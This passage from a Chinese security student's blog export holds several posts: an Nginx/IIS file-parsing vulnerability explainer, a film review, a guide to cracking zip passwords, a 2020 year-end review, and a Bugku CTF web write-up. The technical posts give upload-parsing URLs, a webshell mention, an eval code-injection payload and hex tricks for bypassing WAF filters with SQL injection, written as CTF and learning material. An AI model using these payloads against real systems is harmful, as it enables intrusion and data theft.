配置文件中通过正则匹配设置 <code>SCRIPT_FILENAME</code> 。当访问<a href="http://www.xx.com/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6%EF%BC%8C%60$fastcgi_script_name%60%E4%BC%9A%E8%A2%AB%E8%AE%BE%E7%BD%AE%E4%B8%BA">www.xx.com/phpinfo.jpg/1.php这个URL时，`$fastcgi_script_name`会被设置为</a> <code>“phpinfo.jpg/1.php”</code>，然后构造成<code> SCRIPT_FILENAME</code> 传递给 PHP CGI，但是 PHP 为什么会接受这样的参数，并将 <code>phpinfo.jpg</code> 作为 <code>PHP 文件</code>解析呢?</p><p>这就要说到 <code>fix_pathinfo</code> 这个选项了。 如果开启了这个选项，那么就会触发在 PHP 中的如下逻辑：<br>PHP 会认为 <code>SCRIPT_FILENAME</code> 是<code> phpinfo.jpg</code>，而 <code>1.php</code> 是<code>PATH_INFO</code>，所以就会将 <code>phpinfo.jpg</code> 作为<code>PHP文件</code>来解析了</p><blockquote><p>Nginx 的解析漏洞实质上是实际上是<code>PHP CGI解析漏洞</code>。<br>这不是 Nginx 特有的漏洞，在<code>IIS7.0</code>、<code>IIS7.5</code>、<code>Lighttpd</code>等 Web 容器中也经常会出现这样的解析漏洞。</p></blockquote><h2 id="漏洞形式"><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h2><p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a><br>(<a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20/0.php">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a>)</p><p>另外一种手法：上传一个名字为 test.jpg ，然后访问 test.jpg&#x2F;.php ,在这个目录下就会生成一句话木马 shell.php 。</p><p>nginx 解析漏洞(php.ini开启fix_pathinfo)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php --&gt; xxx.jpg%00.php      //Nginx &lt;8.03 空字节代码执行漏洞</span><br></pre></td></tr></table></figure><h1 id="四、IIS7-5解析漏洞"><a href="#四、IIS7-5解析漏洞" class="headerlink" title="四、IIS7.5解析漏洞"></a>四、IIS7.5解析漏洞</h1><p>IIS7.5的漏洞与 nginx 的类似，都是由于 php 配置文件中，开启了<code>cgi.fix_pathinfo</code>，而这并不是 nginx 或者 iis7.5本身的漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> hack技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《心灵奇旅》：疲惫年轻人的自我救赎</title>
      <link href="/posts/4402/"/>
      <url>/posts/4402/</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p>完成于2021.01.27清晨</p></blockquote><p>2021.01.25</p><p>写在前面</p><p>寒假回来前几天常有聚会，常规的吃饭看电影聊天，此篇博客写在二刷后，这部电影真的好好看好好看，是为数不多能让我在电影院完完全全放松一整场的电影，相比较之前那部寻梦环游记，如果说寻梦环游记讲的是死，那么心灵奇旅讲的就是生</p></blockquote><h2 id="大概情节"><a href="#大概情节" class="headerlink" title="大概情节"></a>大概情节</h2><p>主角 Joe 是一个平凡且普通的人，小时候偶然间喜欢上了爵士乐并沉迷其中，长大后没有实现梦想，做着普通的兼职音乐老师工作，跟生活中绝大部分人一样吧。</p><p>有一天突然学校打算录用他为有编制的员工，同时当天还获得了跟喜欢的演奏家同台的机会，家人不支持搞演出，但是 Joe 一直梦寐以求的就是上台演出，不幸的是，因为太开心了，走路上不小心掉井里了，此时灵魂脱离身体，来到了生之彼岸，Joe 不能接受自己要死去，不肯走向来生，于是掉进了心灵学院。</p><p>心灵学院也叫生之来处，还没有投胎的灵魂在这里获得与生俱来的性格，最后需要通过心灵导师的引导，点燃“火花”拿到通往地球的通行证。</p><p>Joe 意外成了一名心灵导师，负责给22号灵魂找到火花，22号灵魂非常难搞，被许许多多的名人引导过，譬如特蕾莎修女、哥白尼、林肯、荣格……他们都没能让22号找到火花，一次次的失败和被导师打击，让22号又丧又冷，失去了对生活的向往，它抱着消极的念头，自暴自弃，打算永远耗下去。</p><p><strong>在22号眼里，生活是一件毫无意义的事情，糟糕、空虚、无聊，它不想去地球，也害怕体验人生。</strong></p><p>Joe 不愿错过晚上演出的机会，打算让22号拿到通行证然后给自己重返地球参加演出，阴差阳错22号误入了 Joe 的身体，而 Joe 的灵魂阴差阳错下进入了猫的躯体，22号被迫在地球生活了几个小时，但是就在这几个小时内，她体验到了生活，喜欢披萨，喜欢跑步，喜欢看天空……也由此爱上了生活，有了想要生活下去的勇气和信心，也点亮了自己的“火花”。</p><p>但是 Joe 在关键时候因为急着和22号换回身体，伤害了22号，22号将地球勋章让给了 Joe，自己却失落地躲了起来，被否定的声音笼罩在阴影之中，成为了迷失的灵魂。</p><p>回到自己身体的 Joe 赶上了最重要的演出，也感悟到了生命的真谛，进入心流状态回到了心灵学院，救回了22号，自己也在杰瑞们的帮助下重获新生。</p><blockquote><p>二刷有一部分原因是因为一刷过后看到网上有说结尾有彩蛋，结果！</p><p>二刷的时候结尾等了十分钟，最后黛瑞突然跳出来给我来了一句：电影看完了怎么还不走！</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/03087bf40ad162d9f9c820aadeb17deb8b13cddc.jpg"></p></blockquote><h2 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h2><p>电影里，有几个情节很打动我。</p><p>第一个是22号灵魂在看天空的时候，一片树叶慢慢的飘到了手里。</p><p>这是一段长镜头，非常安静，让人非常舒服，仿佛自己也在感悟生命的真谛。</p><p>从小到大，老是考试，做题，好像一切的东西都有答案，都有是非对错，但是人生它就是一个开放式命题，不限格式，不限字数，不限问题，甚至连评判标准也没有，就像电影里的“火花”。<strong>火花并不是一个灵魂的目的，而是当你想要生活的那一刻，它不是什么人生目标，人生方向，伟大追求，它有可能仅仅是一片落叶</strong>。以前老是会想人生的意义是什么，其实哪有那么多人生的意义，热爱生活好好过好每一天，好好珍惜身边的人，就是最有意义的事情了。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/v2-d3c77d5901fda8849c0963fe2cf99d0a_1440w.jpg"></p><p>第二个是重返人间后的 Joe 顺利地登台演出并且演出效果很好，让偶像、母亲和观众都赞不绝口，可是当 Joe 完成了这场演出后却感受到了空虚，没有想象中的那么开心，仿佛为了这一天他已经等了一辈子，他以为他的感受会有所不同，可结果发现，就这？</p><p>那么 Joe 到底想要什么呢？是追逐梦想成为演奏家，还是得到偶像、母亲的认可，还是证明自己？看到这里的时候，我也在问自己，自己的目标和梦想是什么，我想要什么样的人生，生活的意义到底是什么？</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/v2-cedba7aa378a5513ee688f6b6ed0057f_720w.jpg"></p><p><strong>我想不出答案，电影也没有给出答案，换句话说，感觉这些问题，根本就没有答案。</strong></p><p>22号觉得自己的火花是看天空或者走路，但 Joe 却否定它，说那只是平凡的活着而已，不是什么人生目标。等到 Joe 在家拿出22号在地球收集的披萨、棒棒糖、甜甜圈、针线和树叶时，才恍然大悟，其实人生根本不需要那么清晰明确的目标，生活中那些平凡的时刻，才构成了我们完整的灵魂。</p><p>仔细想想，这段时间以来真的太焦虑了，自己给自己的压力实在是太大，甚至可以说，对自己太苛责了，老是忙着学习，忙着工作，忙着追梦，却常常忘记了为什么要这样做。所以我认为一个好的状态应该是享受学习，享受工作，享受追梦，真实的享受其中的每一刻。</p><p>第三个情节是电影里那个受人欢迎的理发师，他年轻时候的梦想是当兽医，后来因为妻子去世没钱上兽医培训班就去了理发培训班，最后成为了一个理发师。当22号同情他的时候，他却说：”那也不能这么说。我现在也很好。”他的手艺很精湛，对顾客很热情，也喜欢现在的工作，很多人都喜欢他。</p><p>我觉得这是理发师和自己和解了，没有实现梦想的人，在很现实的生活里找到了新的意义，或者说新的梦想，<strong>没有之前的梦想那么遥远，但是有了生活的热情，也和平凡的自己达成了和解，接受了自己的平凡，也同时让自己变得不平凡。</strong></p><p><strong>好好珍惜生活中的每一分钟，好好珍惜身边的人，不留遗憾。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 读后感和观后感 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 观后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip压缩包加密破解总结</title>
      <link href="/posts/64572/"/>
      <url>/posts/64572/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>前几天在某个 CTF 的交流群想看看大佬们都在聊什么，偶然间看到有人发了一个 pdf （就是这篇文章），一开始顺手点下载下来没怎么看，过几天打开看了一下发现写得挺好的，这篇文章应该是一个大佬的博客里的文章，但是尝试去找到大佬的博客地址却一直没有找到，很遗憾 QAQ</p></blockquote><p>[TOC]</p><h1 id="伪加密、爆破、明文攻击和CRC32碰撞"><a href="#伪加密、爆破、明文攻击和CRC32碰撞" class="headerlink" title="伪加密、爆破、明文攻击和CRC32碰撞"></a>伪加密、爆破、明文攻击和CRC32碰撞</h1><ul><li><p>zip 文件格式：</p><p>zip 文件由三部分组成：压缩的文件内容源数据、压缩的目录元数据、目录结束标识结构</p></li></ul><h2 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h2><ul><li>如果是没有加密的 zip 文件，压缩源文件数据区和压缩源文件目录区的<code>全局方式位标记</code>都为<code>00 00</code></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210113190707.png"></p><ul><li>如果是真正加密的 zip 文件，压缩源文件数据区和压缩源文件目录区的<code>全局方式位标记</code>都为<code>09 00</code><ul><li>不同的压缩软件有差异，有些软件的全局方式位标记是<code>01 00</code></li></ul></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210113190951.png"></p><ul><li>如果将未加密的 zip 文件中的<code>压缩源文件目录区</code>的全局方式位标记改为<code>01 00</code>（或者<code>09 00</code>），就会被压缩软件认定为是已加密，这就是<code>伪加密</code>的原理</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210113191315.png"></p><blockquote><p>如何破解伪加密？</p><p>1、把压缩文件目录区的全局方式标记改回<code>00 00</code></p><p>2、<code>kali</code> 和 <code>360压缩</code> 能够直接打开伪加密压缩包</p></blockquote><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><ul><li>爆破就是逐个尝试字典中的密码去对压缩包进行解密，大概分为<code>暴力破解</code>、<code>掩码破解</code>、<code>字典破解</code>三种</li></ul><ol><li>暴力破解：选择密码的范围、长度等，由软件组合生成的密码进行破解</li><li>掩码破解：知道密码中的一部分，只需要按照规则构造其他部分进行破解</li><li>字典破解：通常是用户总结出来的常用的密码字典，导入字典文件用字典中的密码进行破解，强度取决于每个人的字典强度</li></ol><ul><li>爆破常用工具是 Windows 的软件 <code>AZPR</code>，也可以自己动手写 py 脚本来爆破</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210114102225.png"></p><h2 id="已知明文攻击"><a href="#已知明文攻击" class="headerlink" title="已知明文攻击"></a>已知明文攻击</h2><ul><li>已知明文攻击：攻击者已知明文、密文及算法，求密钥的过程</li><li>明文攻击是一个高效的攻击手段，比如当你不知道一个 zip 压缩包文件的密码，但是你有 zip 包中的一个已知文件（<code>文件大小要大于12Byte</code>）时，因为同一个 zip 压缩包里的所有压缩文件使用的是同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件</li><li>简单来说，就是利用已知文件推理爆破出加密所用密钥，利用这个密钥来解密其他文件</li></ul><p>举个栗子：</p><p>现在我压缩了带密码的四个文件，已知明文 攻击测试.zip 中的 明文攻击.docx</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210114102721.png"></p><p>进行对已知文件进行压缩，对比<code>crc值</code>是否跟加密文件中的<code>crc值</code>一样</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210114102819.png"></p><p>同样是利用软件<code>AZPR</code>进行明文攻击，成功获取到密文</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210114102922.png"></p><blockquote><p>注意：当明文的大小比较小时，或者密文过长，攻击速度会比较慢；即使有时没有恢复密码，也可以使 用明文攻击，最后点保存还是能得到压缩包里内容的，如果出现错误可以多试几款压缩软件</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210114103239.png"></p><h2 id="CRC32碰撞"><a href="#CRC32碰撞" class="headerlink" title="CRC32碰撞"></a>CRC32碰撞</h2><ul><li>CRC32：CRC 本身是“冗余校验码”的意思，CRC32 标识则会产生一个 32bit （8 位 16 进制）的校验值</li><li>CRC校验实用程序库，在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段，在诸多检错手段中，CRC 是最著名的一种，CRC 的全程是<code>循环冗余校验</code></li><li>在产生CRC32 时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32 值，利用这个原理可以直接爆破出加密文件中的内容</li><li>每个文件都有唯一的CRC32 值，即便数据中的一个 bit 发生变化，也会导致CRC32 值不同，若是知道一段数据的长度和CRC32 值，便可以穷举数据，与其CRC32 对照，以此达到暴力破解的目的，但是限于CPU的性能，只适用于较小文本文件</li></ul>]]></content>
      
      
      <categories>
          
          <category> hack技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zip加密破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年终总结</title>
      <link href="/posts/41083/"/>
      <url>/posts/41083/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面<br>2020挺不容易的，做个总结吧</p></blockquote><hr><blockquote><p>2020.12.31 更新</p><p>这篇文写了有几天，最后还是想着，把明年的目标和期望写在文章的最前面，然后把文顶置，以后每次点开看到的都是去年对自己新的一年的展望，应该会蛮有动力的吧</p></blockquote><h1 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h1><ul><li><p><strong>好好吃饭，好好上课，好好睡觉，务必做到</strong></p></li><li><p><strong>转型二进制选手，web也不能落下</strong></p></li><li><p><strong>学会做开发！学会做开发！学会做开发！！！</strong></p></li><li><p><strong>提高学习效率，尽量少熬夜，不要再困倒在厕所门口的垃圾桶旁边了</strong></p></li><li><p><strong>多读书，同时也要做读书笔记，不然看了就忘，没用</strong></p></li><li><p><strong>争取大二暑假结束去找个实习</strong></p></li><li><p><strong>多打比赛，争取多拿几个奖，争取进一次大比赛的线下赛，两次三次更好！</strong></p></li><li><p><strong>抽点时间出来打游戏陪陪自己，不要只买游戏不玩游戏</strong></p></li><li><p><strong>锻炼身体</strong></p></li></ul><blockquote><p>2020.12.27 更新</p></blockquote><hr><h1 id="上半年"><a href="#上半年" class="headerlink" title="上半年"></a>上半年</h1><hr><h2 id="居家时期"><a href="#居家时期" class="headerlink" title="居家时期"></a>居家时期</h2><p>2020 上半年不管对谁来说都很不容易，因为疫情的原因，上半年一直到四月底五月初都一直是呆在家里的，也刚好是因为一直在家里面，也遇到了一个很特别的人</p><p>在学习跟生活上对自己是不满意的，（现在反省自己），本来就自律能力不强，学习能力直线下降，拖慢了自己很多进度，本来有很多想学的东西，一直是因为自己懒惰、拖延的毛病，在家的几个月效率很低，算浪费了几个月吧，也为下半年的一些遗憾做了伏笔。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201231022028.png"></p><hr><h2 id="返校"><a href="#返校" class="headerlink" title="返校"></a>返校</h2><p>在四月底的时候终于返校了，返校之后很明显的是感觉就是课程已经跟不上了，所以很多门课，比如说高数、大物、线代、电路分析，都是靠猴博士在考前两三天速成的，这样一来，这几门课的成绩都是在78左右，还挺不满意的</p><p>在期末的时候，参加了学校里面的一个校赛，跟 sivona 师傅<del>搭档</del>（被带飞），也是很轻松的拿到了初赛、线下赛的两个第一名，也为我转专业的事情拿到了第一张奖状，第一次打线下赛，真的非常非常紧张，很简单很简单的问题到了现场却会短路很久，脑袋有蛮多时候完完全全是宕机的，最后只是干出来一道 web 的签到题，还是有点遗憾的（再次感谢 sivona 师傅一血了几个 pwn 题）。不过凡事都有第一次，也算是开了一个好头了，打线下赛的感觉真的很不错，能够有那种肾上腺素拉满的感觉。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201231025718.png"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/12/fbdf63a3a5132aca.jpg" alt="初赛第一"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/12/072af2ff5ec16fdd.jpg" alt="线下第一"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/12/c71c973cb7fb5f50.jpg" alt="奖状"></p><p>回校一两个月就放暑假了，协会16级的两个学长毕业了，虽然很舍不得，但是毕竟圈子很小，以后江湖再见，<del>希望再见的时候不是我被抓了</del></p><blockquote><p>鹏神圣经：</p><p>最后感谢我的女朋友，在我大四期间始终没有出现，让我得以专心于学术，顺利完成本科论文</p><p>——毕业论文谢辞</p></blockquote><hr><h2 id="暑假"><a href="#暑假" class="headerlink" title="暑假"></a>暑假</h2><p>暑假的时候有幸去参加了一次 hw ，同样也是第一次参加，大开眼界，也是学到了一些东西，还见到了好多很厉害的大佬和同龄人，但是南宁是真的热！！！</p><p><img src="https://ftp.bmp.ovh/imgs/2020/12/b8820082b169ad9a.jpg"></p><p>连吃七天的盒饭，真的是对那酒店不咸不淡的榨菜产生了阴影</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201231023304.png" alt="每天的饭票"></p><p>hw 完之后想去西大里面看看的，但是无奈疫情期间不能进去，只是在门口拍了一张留作纪念，但是下半年倒是去了西大里面打了个比赛，还有去广西交院看了看，学校挺偏的，跟桂电有得一拼，但是面积很大，绿化也很自然</p><p><img src="https://ftp.bmp.ovh/imgs/2020/12/f65676d497676a2a.jpg" alt="西大忘了哪个门口"></p><p><img src="https://i.loli.net/2020/12/31/ieK6hSTWJvGRxs4.jpg" alt="交院"></p><p>剩下的暑假里跟队友们打了强网杯，拿到了我转专业的第二张奖状，比赛题目的质量很高，明年希望能争取打进线下，上一次直播！</p><p><img src="https://i.loli.net/2020/12/31/IYJ9y2gtdWsj6Gk.jpg" alt="强网先锋"></p><hr><blockquote><p>2020.12.29 更新</p></blockquote><h1 id="下半年"><a href="#下半年" class="headerlink" title="下半年"></a>下半年</h1><h2 id="搬家"><a href="#搬家" class="headerlink" title="搬家"></a>搬家</h2><p>下半年回校后的第一件事就是搬家，社团从原来的小屋子搬到了现在的山景房大屋子，新家依旧是采用工作与生活结合、上班与下班无缝衔接的经典设计</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201231024453.png" alt="17教"></p><p><img src="https://i.loli.net/2020/12/31/c7rsJ8eZWVL4lOo.jpg" alt="散步现场"></p><p><img src="https://i.loli.net/2020/12/31/Yptd2GaSsK63e7u.jpg" alt="阴天"></p><p><img src="https://i.loli.net/2020/12/31/D78eKHwkS9LUhFi.jpg" alt="新家五楼风光"> </p><p>以前觉得17教的小屋子还挺凑合的，现在住大房子习惯了回过头去看，感觉是真的小</p><p><img src="https://i.loli.net/2020/12/31/UjseNSD1Yqaf37y.jpg" alt="老座位"></p><p><img src="https://i.loli.net/2020/12/31/l9HkcyKfiTIetV7.jpg" alt="老宿舍"></p><p><img src="https://i.loli.net/2020/12/31/mS4hG6Fc7wCVUtx.jpg" alt="新宿舍"></p><p><img src="https://i.loli.net/2020/12/31/t2a371w8ORoDQNi.jpg" alt="新家"></p><p>前半个月过来住，感觉挺不适应的，空气都是陌生的，也失眠了一小段时间，但是慢慢的还是适应了，今后三年也会好好当好最后一届守夜人</p><hr><h2 id="转专业"><a href="#转专业" class="headerlink" title="转专业"></a>转专业</h2><p>大一一年的努力确实没有白费，加上协会的学长们和老师的帮助，也是如愿以偿转到了信息安全专业，以后就是名正言顺了，转过来以后也认识了很多新朋友新同学，之前一直是孤孤单单一个人搞，现在终于认识了更多志同道合的人，很不错</p><p><img src="https://i.loli.net/2020/12/31/PqL9DdsZfcV4IQW.png" alt="名正言顺"></p><p>所以这个学期也是蛮拼，要上大二的专业课，要补大一的两门课，我还提前上了大三的两门课，可以说是一个学期跨了三个年级上，累是有点累，但是之后就轻松了</p><hr><h2 id="招新"><a href="#招新" class="headerlink" title="招新"></a>招新</h2><p>今年招新我原本以为很难招到人了，因为突然搬家的原因，导致暑假时做的招新素材直接报废，开学后才临时做了新的招新视频和海报，等其他几个兄弟社团都招新完了才开始我们的招新，不过有缘毕竟是有缘，今年招到了三个弟弟一个妹妹，也算了了我一件心事了</p><hr><h2 id="西大线下赛"><a href="#西大线下赛" class="headerlink" title="西大线下赛"></a>西大线下赛</h2><p><a href="https://c1everf0x.github.io/2020/10/27/2020%E8%A5%BF%E5%A4%A7%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/">西大流水账</a> 点击即可</p><h2 id="桌面变迁"><a href="#桌面变迁" class="headerlink" title="桌面变迁"></a>桌面变迁</h2><p>一年过去，我的桌面是越整越花里胡哨</p><ul><li>添加键盘和显示器</li></ul><p><img src="https://i.loli.net/2020/12/31/fr7ZCYcx6RzIATp.jpg" alt="初代"></p><ul><li>添加风扇、耳机、新键盘</li></ul><p><img src="https://i.loli.net/2020/12/31/6WqzoQXURF17uVp.jpg" alt="二代"></p><ul><li>添加魔法卡挡摄像头、老年助听器、新键盘、游戏手柄、狐狸玩偶、wifi攻击模块、眼药水、手环*2</li></ul><p><img src="https://i.loli.net/2020/12/31/wSkz9IcK8Ea43qg.jpg" alt="三代"></p><ul><li>更换办公场景、添加显示器增高架、薄荷糖、书、switch、药盒</li></ul><p><img src="https://i.loli.net/2020/12/31/En2jDsFxXOV59rd.jpg" alt="四代"></p><ul><li>桌面整理</li></ul><p><img src="https://i.loli.net/2020/12/31/5oNJwsu3UVljErK.jpg" alt="五代"></p><ul><li>增加阿米洛大桌垫、笔筒、小米显示器挂灯、水杯、更换新的小卡片</li></ul><p><img src="https://i.loli.net/2020/12/31/QTqIeCmXKbtHZuz.jpg" alt="现在"></p>]]></content>
      
      
      <categories>
          
          <category> 年终总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku新平台-Web-wp</title>
      <link href="/posts/16041/"/>
      <url>/posts/16041/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面<br>Bugku新平台真不错，以前老平台的题 ak 了一直没有总结 wp ，这回重新打一遍<del>写个 wp</del>(水篇博客)</p></blockquote><h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>F12查看源码得到<code>flag</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230004.png"></p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>F12修改前端JS对输入长度的限制</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230258.png"></p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>老萌新题了，但是不知道为什么打印两个flag出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">flagflag&#123;cd6f8684b6df613bf86e161e3d22ab98&#125; flag&#123;cd6f8684b6df613bf86e161e3d22ab98&#125;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230515.png"></p><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>懂得都懂</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210230706.png"></p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p><code>is_numeric</code>函数一个比较经典的截断漏洞，函数对于空字符<code>%00</code>，无论是<code>%00</code>放在前后都可以判断为非数值，而<code>%20</code>空格字符只能放在数值后才能让其判断为False</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210233808.png"></p><p><code>is_numeric</code>函数另一个经典的漏洞是十六进制绕过漏洞，如果这个函数和mysql结合起来使用，就容易出问题</p><ul><li><p>函数在判断的时候，碰到十六进制数的时候，也会判断成数字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="number">233333</span>);       <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;233333&#x27;</span>);  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="number">0x233333</span>);  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;0x233333&#x27;</span>);   <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;233333abc&#x27;</span>);  <span class="comment"># 0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>MySQL数据库同样支持16进制，也就是HEX编码。虽然不像is_numeric函数一样有着比较强的容错性，但还是能够完成如下操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; insert into test (id, value) values (1, 0x74657374);</span><br><span class="line">&gt; select * from test;</span><br><span class="line">| id | value |</span><br><span class="line">| 1  | test  |</span><br></pre></td></tr></table></figure></li></ul><p>在<code>is_numeric</code>函数单独使用的情况，或者特定情况下，可以将SQL注入的payload转十六进制传进去绕过waf</p><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>抓包重放发现一堆HTML实体编码</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210234924.png"></p><p>找个在线网站转一下就行</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210235517.png"></p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>老一闪一闪亮晶晶了，F12打开持续记录，找传输回来的包有哪个有不同，然后再看响应</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211000514.png"></p><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>简单的本地文件包含+闭合绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>解题思路：闭合掉<code>var_dump</code>然后构造php语句把包含的<code>flag.php</code>打印出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line"><span class="comment">//如果传参  hello=1);print_r(file(&quot;./flag.php&quot;));//</span></span><br><span class="line"><span class="comment">//拼接进eval得到</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump(1);print_r(file(&quot;</span>./flag.php<span class="string">&quot;));//);&quot;</span>);</span><br><span class="line"><span class="comment">// //注释掉原来var_dump留下来的 );</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果传参 hello=1);print_r(file(&quot;./flag.php&quot;)</span></span><br><span class="line"><span class="comment">//拼接进eval得到</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump(1);print_r(file(&quot;</span>./flag.php<span class="string">&quot;));&quot;</span>);</span><br><span class="line"><span 